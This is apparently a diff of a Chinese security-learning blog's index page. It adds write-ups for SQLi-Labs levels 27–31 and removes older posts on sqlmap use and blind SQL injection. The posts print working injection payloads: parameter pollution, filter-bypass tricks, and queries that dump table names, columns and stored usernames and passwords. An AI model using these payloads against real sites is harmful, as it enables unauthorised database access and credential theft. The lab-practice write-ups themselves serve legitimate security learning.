@@ -71,6 +71,105 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-23" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/07/page-23/" class="article-date">
+  <time class="dt-published" datetime="2021-02-07T07:58:08.000Z" itemprop="datePublished">2021-02-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/07/page-23/">sqlilabs 29 30 31</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>这关拥有很强大的防火墙 </p>
+<p>所以需要使用http参数污染 通<img src="https://img-blog.csdnimg.cn/20201011115133598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>过在http请求中插入特定参数发起攻击  原理差不多是这样</p>
+<p>后端是apache 那么吧参数放在后面 即可 传递两个id 前者合法后者为想要注入的内容</p>
+<p>?id=1&amp;id=-1’ union select 1,2,3 –+ 显位</p>
+<p>?id=1&amp;id=-1’ union select 1,2,database() –+  数据库</p>
+<p>之后就是一顿操作组合拳 就可以了和之前的一样的语句</p>
+<p>30的话双引号就ok了 没别的什么区别了</p>
+<p>31就双引号加括号 就可以了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/07/page-23/" data-id="cksyl7wj8000mw4w75ydi2tex" data-title="sqlilabs 29 30 31" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-21" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/06/page-21/" class="article-date">
+  <time class="dt-published" datetime="2021-02-06T07:46:05.000Z" itemprop="datePublished">2021-02-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/06/page-21/">sqlilabs 27 27a 28 28a</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>a这关过滤了union 和select UNION SELECT Union Select  但是并没有过滤掉所有的可以书写的情况</p>
+<p>所以 unION selEct这样子的还是可以使用的   还过滤了空格 用%0a替代</p>
+<p>或者双写 unionunion selectselect  还有这关采用了    正则表达式负号用不了就只好用0或者666之类的</p>
+<p>?id=0’%0aunION%0aselECT%0a1,2,3||’1’=’1 （||这个可用and或者or替代都行）</p>
+<p>测显示位 loginname 2 password那边显示1</p>
+<p>所以 ?id=0’%0aunION%0aSELECt%0a1,database(),3||’1’=’1 数据库</p>
+<p>?id=0’%0aunION%0aSELECt%0a1,(selECT%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=’security’),3||’1’=’1   爆表名</p>
+<p>?id=0’%0aunION%0aSELECt%0a1,(selECT%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=’users’),3||’1’=’1  爆users表内的列名</p>
+<p>?id=0’%0aunION%0aSELECt%0a1,(selECT%0agroup_concat(username,’|’,password)%0afrom%0users),3||’1’=’1   获取数据 </p>
+<p>ok 27关结束 </p>
+<p>27a不知道为什么%0a用不了  用）这个替代也可以还有?id=0’ 单引号换双引号</p>
+<p>28就?id=0’) 多个括号 还有没法像27那样有的大写小写绕过 还有就是相连的union select 就双写绕过嘛 unionunion%0aselect%0aselect  还有就是末尾闭合用；%00 </p>
+<p>28a 空格过滤没掉了那就不用%0a了 就和上面的一样的语句 </p>
+<p>井号被过滤可用%23 </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/06/page-21/" data-id="cksyl7wj9000ow4w72vj2a02k" data-title="sqlilabs 27 27a 28 28a" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-20" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/02/05/page-20/" class="article-date">
@@ -434,96 +533,6 @@
 
 
   
-    <article id="post-page-8" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/01/20/page-8/" class="article-date">
-  <time class="dt-published" datetime="2021-01-20T06:43:56.000Z" itemprop="datePublished">2021-01-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/01/20/page-8/">page less 11-20</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>a到十一这些都是post型的可用sqlmap 粗暴的方式解题 用火狐打开 然后f12选择网络那个选项里头的有个post那项右键复制请求头</p>
-<p> 然后随便生成一个文本文档粘贴进去 </p>
-<p>再在网页那边随便输入用户名密码 </p>
-<p>再次复制 这次复制post数据像这样子的uname=aaa&amp;passwd&amp;submit=Submit//&amp;这个符号要自己加</p>
-<p>之后win+r cmd sqlmap.py -r “刚才那个文本文档的地址\mingzi.txt” –current-db –batch </p>
-<p>爆出当前数据库 之后sqlmap.py -r “刚才那个文本文档的地址\mingzi.txt” -D 库名 –tables –batch</p>
-<p>库名表明 爆表名字是需要 -C 表明 –dump 加上个dump </p>
-<p>ps 如果觉得速度慢点话加个 –thread 10 有的关如果爆不出来提高level  –level 2-5选一个</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/20/page-8/" data-id="cksyl7wk0001xw4w70wje2cg5" data-title="page less 11-20" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-5" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/11/25/page-5/" class="article-date">
-  <time class="dt-published" datetime="2020-11-25T12:28:10.000Z" itemprop="datePublished">2020-11-25</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/11/25/page-5/">盲注</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>?id=1’ and length(database())=n %23 n从0到无穷大 猜出数据库长度 </p>
-<p>?id=1’ and left(database(),1)&gt;’<em><strong>a</strong></em>‘–+ 猜数据库首字母 显示you are in 表示该字母还在输入的字母后假设输入一个显示you are in的下一个什么都没显示 则为此 第二第三位一次猜下去（猜库名）</p>
-<ul>
-<li>利用substr() ascii()函数进行尝试</li>
-</ul>
-<p>?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <strong>0</strong>,1),<em><strong>1</strong></em>,1))&gt;<strong>100</strong>–+  加黑数字更改 此为ascii码对照数字对应字母 也是和猜库名一样的操作  这猜第一个库的第一个字符   然后一个一个改 猜出第n个库的第n个字符</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/25/page-5/" data-id="cksyl7wjk0017w4w7c8nmentr" data-title="盲注" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -560,6 +569,14 @@
       <ul>
         
           <li>
+            <a href="/2021/09/22/page-118/">长城杯flag保熟</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/22/page-117/">第五空间misc</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/19/page-116/">第五空间WEBFTP pklovecloud</a>
           </li>
         
@@ -569,14 +586,6 @@
         
           <li>
             <a href="/2021/09/09/page-114/">page</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-110/">一大堆的misc 很大一堆</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-109/">网鼎杯 2020 白虎组PicDown</a>
           </li>
         
       </ul>
